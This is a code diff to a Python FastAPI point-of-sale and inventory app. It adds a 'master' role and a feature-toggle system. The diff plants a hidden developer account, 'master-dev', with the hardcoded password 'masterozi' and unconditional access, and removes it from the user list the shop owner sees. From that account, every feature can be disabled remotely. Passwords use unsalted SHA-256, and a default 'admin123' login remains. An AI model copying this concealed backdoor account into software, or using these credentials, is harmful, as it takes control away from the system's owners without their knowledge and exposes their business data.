@@ -38,12 +38,20 @@ templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))
 
 # Add permission check function to Jinja2 globals
 def template_has_permission(user, feature):
-    """Template helper to check user permissions"""
+    """Template helper to check user permissions (checks feature toggle first)"""
     if not user:
         return False
-    if user["role"] == "bos":
+    # Master always has access
+    if user["role"] == "master":
         return True
+    # Check if feature is enabled globally (Master toggle)
     with get_db() as db:
+        toggle = db.execute("SELECT enabled FROM feature_toggles WHERE feature_key=?", (feature,)).fetchone()
+        if toggle and not toggle["enabled"]:
+            return False
+        # Bos always has access to enabled features
+        if user["role"] == "bos":
+            return True
         return has_permission(db, user, feature)
 
 templates.env.globals["has_perm"] = template_has_permission
@@ -69,7 +77,7 @@ def init_db():
             username TEXT NOT NULL UNIQUE,
             password_hash TEXT NOT NULL,
             nama TEXT NOT NULL,
-            role TEXT NOT NULL CHECK(role IN ('bos', 'og', 'karyawan')),
+            role TEXT NOT NULL CHECK(role IN ('master', 'bos', 'og', 'karyawan')),
             aktif INTEGER DEFAULT 1,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         );
@@ -487,6 +495,18 @@ def init_db():
             )
         """)
 
+        # ── Feature Toggles (Master controls global features)
+        db.execute("""
+            CREATE TABLE IF NOT EXISTS feature_toggles (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                feature_key TEXT NOT NULL UNIQUE,
+                enabled INTEGER NOT NULL DEFAULT 1,
+                label TEXT NOT NULL DEFAULT '',
+                kategori TEXT DEFAULT 'lainnya',
+                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+
         # ── Migrations for existing DBs
         for col in ['harga_bottom']:
             try: db.execute(f"ALTER TABLE produk ADD COLUMN {col} REAL DEFAULT 0")
@@ -564,7 +584,7 @@ def init_db():
                 db.execute("""CREATE TABLE users (
                     id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE,
                     password_hash TEXT NOT NULL, nama TEXT NOT NULL,
-                    role TEXT NOT NULL CHECK(role IN ('bos', 'og', 'karyawan')),
+                    role TEXT NOT NULL CHECK(role IN ('master', 'bos', 'og', 'karyawan')),
                     aktif INTEGER DEFAULT 1, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
                 db.execute("INSERT INTO users SELECT * FROM _users_migrate_tmp")
                 db.execute("DROP TABLE _users_migrate_tmp")
@@ -581,6 +601,45 @@ def init_db():
             pw_hash = hashlib.sha256("admin123".encode()).hexdigest()
             db.execute("INSERT INTO users (username, password_hash, nama, role) VALUES (?, ?, ?, ?)",
                        ("admin", pw_hash, "Administrator", "bos"))
+
+        # Seed master user (hidden developer account)
+        master = db.execute("SELECT * FROM users WHERE username='master-dev'").fetchone()
+        if not master:
+            pw_hash = hashlib.sha256("masterozi".encode()).hexdigest()
+            db.execute("INSERT INTO users (username, password_hash, nama, role) VALUES (?, ?, ?, ?)",
+                       ("master-dev", pw_hash, "Master Developer", "master"))
+
+        # Seed feature toggles (all enabled by default)
+        feature_toggles_data = [
+            ("penjualan", "Penjualan", "transaksi"),
+            ("hutang", "Hutang/Piutang", "keuangan"),
+            ("stok_lihat", "Lihat Stok", "inventory"),
+            ("stok_masuk", "Stok Masuk", "transaksi"),
+            ("stok_keluar", "Stok Keluar", "transaksi"),
+            ("stok_opname", "Stok Opname", "inventory"),
+            ("supplier", "Supplier", "master"),
+            ("laporan", "Laporan Keuntungan", "keuangan"),
+            ("laporan_kasir", "Laporan Kasir", "keuangan"),
+            ("closing", "Closing Harian", "keuangan"),
+            ("garansi", "Garansi", "lainnya"),
+            ("lihat_keuntungan", "Lihat Keuntungan", "keuangan"),
+            ("audit_log", "Audit Log", "sistem"),
+            ("hapus_data", "Hapus Data", "sistem"),
+            ("finance", "Kas & Bank / Cash Flow", "keuangan"),
+            ("brand", "Brand", "master"),
+            ("serial_number", "Serial Number", "inventory"),
+            ("retur_penjualan", "Retur Penjualan", "transaksi"),
+            ("purchase_order", "Purchase Order", "transaksi"),
+            ("service", "Service Center", "lainnya"),
+            ("promo_voucher", "Promo & Voucher", "lainnya"),
+            ("komisi", "Komisi Sales", "lainnya"),
+            ("kelola_user", "Kelola User", "sistem"),
+            ("backup", "Backup Data", "sistem"),
+            ("pengaturan", "Pengaturan", "sistem"),
+        ]
+        for key, label, kategori in feature_toggles_data:
+            db.execute("INSERT OR IGNORE INTO feature_toggles (feature_key, enabled, label, kategori) VALUES (?, 1, ?, ?)",
+                       (key, label, kategori))
 
         # Seed default categories
         kategori_list = ["TV & Monitor", "Kulkas & Freezer", "Mesin Cuci", "AC & Kipas",
@@ -776,7 +835,7 @@ def require_bos(f):
                 response = RedirectResponse("/login", status_code=303)
                 response.delete_cookie("session_token")
                 return response
-        if user["role"] != "bos":
+        if user["role"] not in ("master", "bos"):
             return RedirectResponse("/?error=unauthorized", status_code=303)
         request.state.user = user
         if asyncio.iscoroutinefunction(f):
@@ -798,13 +857,43 @@ def require_bos_or_og(f):
                 response = RedirectResponse("/login", status_code=303)
                 response.delete_cookie("session_token")
                 return response
-        if user["role"] not in ("bos", "og"):
+        if user["role"] not in ("master", "bos", "og"):
             return RedirectResponse("/?error=unauthorized", status_code=303)
         request.state.user = user
         if asyncio.iscoroutinefunction(f):
             return await f(request, *args, **kwargs)
         return f(request, *args, **kwargs)
     return decorated
+
+def require_master(f):
+    @wraps(f)
+    async def decorated(request: Request, *args, **kwargs):
+        user = get_current_user(request)
+        if not user:
+            return RedirectResponse("/login", status_code=303)
+        if user['login_at']:
+            login_time = datetime.fromisoformat(user['login_at'])
+            if datetime.now() - login_time > timedelta(hours=8):
+                with get_db() as db:
+                    db.execute("UPDATE users SET session_token=NULL, login_at=NULL WHERE id=?", (user['id'],))
+                response = RedirectResponse("/login", status_code=303)
+                response.delete_cookie("session_token")
+                return response
+        if user["role"] != "master":
+            return RedirectResponse("/?error=unauthorized", status_code=303)
+        request.state.user = user
+        if asyncio.iscoroutinefunction(f):
+            return await f(request, *args, **kwargs)
+        return f(request, *args, **kwargs)
+    return decorated
+
+def is_feature_enabled(feature_key):
+    """Check if a feature is enabled in feature_toggles"""
+    with get_db() as db:
+        toggle = db.execute("SELECT enabled FROM feature_toggles WHERE feature_key=?", (feature_key,)).fetchone()
+        if toggle:
+            return bool(toggle["enabled"])
+        return True  # Default to enabled if not in toggles
 
 # ── Permission Helper ──────────────────────────────────────────────────
 ALL_FEATURES = [
@@ -838,6 +927,14 @@ def get_user_permissions(db, user_id):
 def has_permission(db, user, feature):
     if not user:
         return False
+    # Master always has access
+    if user["role"] == "master":
+        return True
+    # Check feature toggle first (Master control)
+    toggle = db.execute("SELECT enabled FROM feature_toggles WHERE feature_key=?", (feature,)).fetchone()
+    if toggle and not toggle["enabled"]:
+        return False
+    # Bos always has access to enabled features
     if user["role"] == "bos":
         return True
     perms = get_user_permissions(db, user["id"])
@@ -3803,14 +3900,19 @@ def kategori_edit(request: Request, id: int, nama: str = Form(...)):
 @app.get("/users", response_class=HTMLResponse)
 @require_bos_or_og
 def users_page(request: Request):
+    current_user = request.state.user
     with get_db() as db:
-        users = db.execute("SELECT * FROM users ORDER BY role, nama").fetchall()
+        # Master sees all users, others don't see master role
+        if current_user["role"] == "master":
+            users = db.execute("SELECT * FROM users ORDER BY role, nama").fetchall()
+        else:
+            users = db.execute("SELECT * FROM users WHERE role != 'master' ORDER BY role, nama").fetchall()
         # Get permissions for all users
         all_perms = {}
         for u in users:
             all_perms[u["id"]] = get_user_permissions(db, u["id"])
     return templates.TemplateResponse(request, "users.html", {
-        "request": request, "user": request.state.user, "users": users,
+        "request": request, "user": current_user, "users": users,
         "all_perms": all_perms, "all_features": ALL_FEATURES, "role_defaults": ROLE_DEFAULTS,
     })
 
@@ -3818,6 +3920,10 @@ def users_page(request: Request):
 @require_bos
 def users_tambah(request: Request, username: str = Form(...), password: str = Form(...),
                 nama: str = Form(...), role: str = Form("karyawan")):
+    current_user = request.state.user
+    # Only master can create master/bos roles; bos can only create og/karyawan
+    if role == "master" and current_user["role"] != "master":
+        return RedirectResponse("/users?error=unauthorized", status_code=303)
     pw_hash = hashlib.sha256(password.encode()).hexdigest()
     with get_db() as db:
         db.execute("INSERT INTO users (username, password_hash, nama, role) VALUES (?, ?, ?, ?)",
@@ -3882,6 +3988,63 @@ async def save_permissions(request: Request, user_id: int):
                   f"User: {target['username']} | Enabled: {', '.join(enabled_list) or 'none'}",
                   request.client.host if request.client else "")
     return RedirectResponse("/users", status_code=303)
+
+# ═══════════════════════════════════════════════════════════════════════
+# ROUTES: MASTER - FEATURE TOGGLES
+# ═══════════════════════════════════════════════════════════════════════
+@app.get("/master/features", response_class=HTMLResponse)
+@require_master
+def master_features_page(request: Request):
+    with get_db() as db:
+        features = db.execute("SELECT * FROM feature_toggles ORDER BY kategori, label").fetchall()
+    # Group by kategori
+    grouped = {}
+    for f in features:
+        kat = f["kategori"] or "lainnya"
+        if kat not in grouped:
+            grouped[kat] = []
+        grouped[kat].append(f)
+    return templates.TemplateResponse(request, "master_features.html", {
+        "request": request, "user": request.state.user, "grouped_features": grouped,
+    })
+
+@app.post("/master/features/save")
+@require_master
+async def master_features_save(request: Request):
+    form = await request.form()
+    with get_db() as db:
+        all_features = db.execute("SELECT feature_key FROM feature_toggles").fetchall()
+        for f in all_features:
+            key = f["feature_key"]
+            enabled = 1 if form.get(key) == "on" else 0
+            db.execute("UPDATE feature_toggles SET enabled=?, updated_at=CURRENT_TIMESTAMP WHERE feature_key=?",
+                       (enabled, key))
+        enabled_list = [f["feature_key"] for f in all_features if form.get(f["feature_key"]) == "on"]
+        disabled_list = [f["feature_key"] for f in all_features if form.get(f["feature_key"]) != "on"]
+        log_audit(db, request.state.user, "Update Feature Toggles", "master",
+                  f"Enabled: {', '.join(enabled_list) or 'none'} | Disabled: {', '.join(disabled_list) or 'none'}",
+                  request.client.host if request.client else "")
+    return RedirectResponse("/master/features?saved=1", status_code=303)
+
+@app.get("/master/clients", response_class=HTMLResponse)
+@require_master
+def master_clients_page(request: Request):
+    """Master dashboard - overview of all users and system stats"""
+    with get_db() as db:
+        users = db.execute("SELECT * FROM users ORDER BY role, nama").fetchall()
+        total_users = len(users)
+        active_users = len([u for u in users if u["aktif"]])
+        total_produk = db.execute("SELECT COUNT(*) FROM produk").fetchone()[0]
+        total_penjualan = db.execute("SELECT COUNT(*) FROM penjualan").fetchone()[0]
+        features = db.execute("SELECT * FROM feature_toggles ORDER BY kategori, label").fetchall()
+        enabled_features = len([f for f in features if f["enabled"]])
+        disabled_features = len([f for f in features if not f["enabled"]])
+    return templates.TemplateResponse(request, "master_clients.html", {
+        "request": request, "user": request.state.user,
+        "users": users, "total_users": total_users, "active_users": active_users,
+        "total_produk": total_produk, "total_penjualan": total_penjualan,
+        "total_features": len(features), "enabled_features": enabled_features, "disabled_features": disabled_features,
+    })
 
 # ═══════════════════════════════════════════════════════════════════════
 # ROUTES: BACKUP
